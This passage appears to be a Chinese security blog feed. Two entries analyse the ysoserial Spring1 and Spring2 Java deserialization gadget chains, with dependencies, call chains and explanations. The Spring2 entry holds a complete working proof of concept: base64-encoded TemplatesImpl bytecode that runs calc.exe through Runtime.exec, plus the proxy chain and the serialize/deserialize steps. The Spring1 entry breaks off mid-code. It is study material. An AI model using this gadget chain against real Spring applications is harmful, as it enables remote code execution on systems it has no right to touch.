    <content type="html"><![CDATA[<h1 id="Spring2"><a href="#Spring2" class="headerlink" title="Spring2"></a>Spring2</h1><p>跟Spring1差不多，依赖不同了。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>&lt;groupId&gt;org.springframework&lt;/groupId&gt;<br>&lt;artifactId&gt;spring-core&lt;/artifactId&gt;<br>&lt;version&gt;<span class="hljs-number">4.1</span><span class="hljs-number">.4</span>.RELEASE&lt;/version&gt;<br>&lt;/dependency&gt;<br>&lt;dependency&gt;<br>&lt;groupId&gt;org.springframework&lt;/groupId&gt;<br>&lt;artifactId&gt;spring-aop&lt;/artifactId&gt;<br>&lt;version&gt;<span class="hljs-number">4.1</span><span class="hljs-number">.4</span>.RELEASE&lt;/version&gt;<br>   &lt;/dependency&gt;<br></code></pre></td></tr></table></figure><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()<br>    SerializableTypeWrapper.TypeProvider(Proxy).getType()<br>    AnnotationInvocationHandler.invoke()<br>    ReflectionUtils.invokeMethod()<br>    Templates(Proxy).newTransformer()<br>    JdkDynamicAopProxy.invoke()<br>                        AopUtils.invokeJoinpointUsingReflection()<br>    TemplatesImpl.newTransformer()<br></code></pre></td></tr></table></figure><p>与Spring1的区别 </p><p><code>JdkDynamicAopProxy.invoke()</code><br>                        <code>AopUtils.invokeJoinpointUsingReflection()</code></p><h2 id="JdkDynamicAopProxy"><a href="#JdkDynamicAopProxy" class="headerlink" title="JdkDynamicAopProxy"></a>JdkDynamicAopProxy</h2><p>看名字就知道是个代理，而且刚好代替了spring1的</p><p><code>AutowireUtils$ObjectFactoryDelegatingInvocationHandler.invoke()</code><br>                        <code>ObjectFactory(Proxy).getObject()</code>。确认一下。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204091123826.png" alt="QQ截图20220409110031"></p><p>看一下这个类的invoke。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204091122483.png" alt="QQ截图20220409105415"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204091122001.png" alt="QQ截图20220409105445"></p><p>获取 AdvisedSupport 里的 TargetSource，并调用 <code>getTarget()</code> 方法返回其中的对象</p><p>接着利用了反射。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204091122740.png" alt="QQ截图20220409105727"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204091122549.png" alt="QQ截图20220409105727"><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204091058943.png" alt="QQ截图20220409105803"></p><p>所以又是只要控制method为newTransform（）就可。这里已经跟Spring1链接了起来。</p><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p>正是因为     AdvisedSupport 里的 TargetSource，并调用 <code>getTarget()</code> 方法返回其中的对象。这里就不需要像Spring1中那样动态代理返回任意方法。（相对来说感觉是是Spring1的简化版了）<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204091122419.png" alt="QQ截图20220409111650"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">as</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>as.setTarget(templates);<br></code></pre></td></tr></table></figure><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spring2Test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br><br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">as</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        as.setTarget(templates);<br><br>        Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        Class&lt;?&gt;       clazz          = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>        Constructor&lt;?&gt; aopConstructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        aopConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">aopProxy</span> <span class="hljs-operator">=</span> (InvocationHandler) aopConstructor.newInstance(as);<br><br><br>        <span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplateProxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, aopProxy);<br><br><br>        HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplateProxy);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);<br><br>        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br><br><br><br>        Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        cons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> cons.newInstance(typeProviderProxy, Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>), <span class="hljs-number">0</span>);<br>        <span class="hljs-type">Field</span>  <span class="hljs-variable">field</span>   <span class="hljs-operator">=</span> clazz2.getDeclaredField(<span class="hljs-string">&quot;methodName&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(objects, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br><br>        serialize(objects);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Spring</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring1</title>
    <link href="/2022/04/09/Spring1/"/>
    <url>/2022/04/09/Spring1/</url>
    
    <content type="html"><![CDATA[<h1 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h1><p>最近出了个大核弹，想要学习一下发现yso都没弄完，php方面的知识遗漏太多了，动不动就不会。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Spring1<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.1.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-beans<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.1.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()<br>    SerializableTypeWrapper.TypeProvider(Proxy).getType()<br>    AnnotationInvocationHandler.invoke()<br>    ReflectionUtils.invokeMethod()<br>    Templates(Proxy).newTransformer()<br>    AutowireUtils$ObjectFactoryDelegatingInvocationHandler.invoke()<br>    ObjectFactory(Proxy).getObject()<br>    TemplatesImpl.newTransformer()<br></code></pre></td></tr></table></figure><p>跟着yso的代码分析一下。</p><h2 id="SerializableTypeWrapper-MethodInvokeTypeProvider"><a href="#SerializableTypeWrapper-MethodInvokeTypeProvider" class="headerlink" title="SerializableTypeWrapper#MethodInvokeTypeProvider"></a>SerializableTypeWrapper#MethodInvokeTypeProvider</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204081527108.png" alt="QQ截图20220408152722"></p><p>有readObject，并且这里接口TypeProvider是继承Serializable，可以反序列化。跟进仔细读一下findMethod。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204081558694.png" alt="QQ截图20220408155823">如果此Class是接口，则此方法返回true。否则返回false。获取了其中的getMehod方法。接着判断了传入的方法是不是传入类的getName。然后返回Method。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204081605334.png" alt="QQ截图20220408160524"></p><p>紧接着反射调用此方法。也就是说在这里把 <code>methodName</code> 改为 <code>newTransformer</code> 方法，然后把 <code>this.provider.getType()</code> 想办法处理成 <code>TemplatesImpl</code> ，就可以触发漏洞了。</p><h2 id="ObjectFactoryDelegatingInvocationHandler"><a href="#ObjectFactoryDelegatingInvocationHandler" class="headerlink" title="ObjectFactoryDelegatingInvocationHandler"></a>ObjectFactoryDelegatingInvocationHandler</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204081620256.png" alt="QQ截图20220408162041"></p><p> 很明显该类是InvocationHandler 的实现类，实例化时接收一个 ObjectFactory 对象，并在 invoke 代理时调用 ObjectFactory 的 getObject 方法返回 ObjectFactory 的实例用于 Method 的反射调用。那么这里就能够利用动态代理实现任意对象。</p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>利用 <code>AnnotationInvocationHandler</code> 控制代理方法调用的返回值。 在 <code>invoke()</code> 方法中的，当 proxy class 调用的方法名不是 <code>equals</code>、<code>toString</code>、<code>hashCode</code>、<code>annotationType</code> 时，会从 <code>memberValues</code> (类型为 Map) 取 key 为 <code>method</code> 对应的值。因为 <code>memberValues</code> 是可控的，因此可以指定某个方法的返回值。</p><p>如下:</p><h2 id="ObjectFactory-Proxy-getObject"><a href="#ObjectFactory-Proxy-getObject" class="headerlink" title="ObjectFactory(Proxy).getObject()"></a>ObjectFactory(Proxy).getObject()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map.put(<span class="hljs-string">&quot;getObject&quot;</span>, templates);<br><br><span class="hljs-comment">// 使用动态代理初始化 AnnotationInvocationHandler</span><br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);<br><br><span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 ObjectFactory 的 getObject 方法，使其返回 TemplatesImpl</span><br>ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(<br>        ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;ObjectFactory.class&#125;, invocationHandler);<br></code></pre></td></tr></table></figure><h2 id="AutowireUtils-ObjectFactoryDelegatingInvocationHandler-invoke"><a href="#AutowireUtils-ObjectFactoryDelegatingInvocationHandler-invoke" class="headerlink" title="AutowireUtils$ObjectFactoryDelegatingInvocationHandler.invoke()"></a>AutowireUtils$ObjectFactoryDelegatingInvocationHandler.invoke()</h2><p>使用该类进行传入TemplatesImpl，进行Method.invoke()的调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt;       clazz          = Class.forName(<span class="hljs-string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);<br>       Constructor&lt;?&gt; ofdConstructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>       ofdConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>              <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">ofdHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) ofdConstructor.newInstance(factory);<br></code></pre></td></tr></table></figure><p>现在要解决的问题就是需要传入Method—&gt;newTransform。</p><p>这里同时也可以注意到ObjectFactoryDelegatingInvocationHandler是继承了InvocationHandler。所以同样可以利用动态代理进行操作。只需要返回一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类。在MethodInvokeTypeProvider中进行this.provider.getType()的时候判断不为空，传入那么就可以这样了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplateProxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, ofdHandler);<br></code></pre></td></tr></table></figure><h2 id="erializableTypeWrapper-TypeProvider-Proxy-getType"><a href="#erializableTypeWrapper-TypeProvider-Proxy-getType" class="headerlink" title="erializableTypeWrapper.TypeProvider(Proxy).getType()"></a>erializableTypeWrapper.TypeProvider(Proxy).getType()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code 